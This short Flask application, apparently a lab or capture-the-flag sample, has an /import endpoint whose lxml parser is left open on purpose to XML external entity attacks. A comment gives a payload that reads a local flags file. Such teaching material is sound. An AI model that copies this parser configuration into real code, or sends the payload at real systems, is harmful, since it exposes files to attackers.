# Flask + lxml

from flask import Flask, request
from lxml import etree

app = Flask(__name__)

# Vuln: parser con resolucion de entidades y acceso a red
@app.post("/import")
def import_note():
    parser = etree.XMLParser(resolve_entities=True, no_network=False, load_dtd=True)
    root = etree.fromstring(request.data, parser)
    return root.findtext("body")
    # <!DOCTYPE r [<!ENTITY x SYSTEM "file:///data/flags.txt">]><note><body>&x;</body></note>
